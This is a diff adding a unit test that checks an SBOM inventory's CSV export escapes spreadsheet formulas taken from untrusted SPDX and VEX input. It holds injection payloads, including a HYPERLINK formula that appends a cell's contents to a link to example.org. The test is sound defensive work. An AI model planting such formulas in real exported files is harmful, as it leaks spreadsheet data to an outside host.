@@ -60,6 +60,38 @@ describe('inventory', () => {
     expect(csv).toContain('"weird, ""pkg"""');
     expect(csv.split('\r\n')[0]).toBe('name,version,license,supplier,purpose,purl,spdxId,kind,document');
   });
+
+  it('exports a formula from the SBOM as text, npm scopes and plain values unchanged', () => {
+    const hostile = loadedFromText(
+      'hostile.spdx',
+      tagValueDoc('hostile', [
+        ['=HYPERLINK("http://example.org/?"&A1,"click")', '1.0.0'],
+        ['@types/node', '20.11.0', 'pkg:npm/%40types/node@20.11.0'],
+        ['-2+3', '+1'],
+        ['left-pad', '1.3.0', 'pkg:npm/left-pad@1.3.0'],
+      ]),
+    );
+    const wsh = addDocument(emptyWorkspace, hostile).workspace;
+    const rows = inventoryRows(wsh, '', emptyFacets);
+    const lines = inventoryToCsv(rows).split('\r\n');
+    expect(lines).toContain(`"'=HYPERLINK(""http://example.org/?""&A1,""click"")",1.0.0,,,,,SPDXRef-P0,package,hostile`);
+    expect(lines).toContain('@types/node,20.11.0,,,,pkg:npm/%40types/node@20.11.0,SPDXRef-P1,package,hostile');
+    expect(lines).toContain("'-2+3,'+1,,,,,SPDXRef-P2,package,hostile");
+    expect(lines).toContain('left-pad,1.3.0,,,,pkg:npm/left-pad@1.3.0,SPDXRef-P3,package,hostile');
+
+    // The VEX overlay columns come from another untrusted document.
+    const leftPad = rows.find((r) => r.element.name === 'left-pad')!;
+    const finding = {
+      vulnerability: '=1+1',
+      status: 'affected',
+      source: 'vex.json',
+      sourceFile: 'vex.json',
+      viaSubcomponent: false,
+      matchedBy: 'purl',
+    } as const;
+    const withVex = inventoryToCsv([leftPad], new Map([[leftPad.element.id, [finding]]])).split('\r\n');
+    expect(withVex[1]).toBe("left-pad,1.3.0,,,,pkg:npm/left-pad@1.3.0,SPDXRef-P3,package,hostile,affected,'=1+1 (affected)");
+  });
 });
 
 describe('version conflicts', () => {
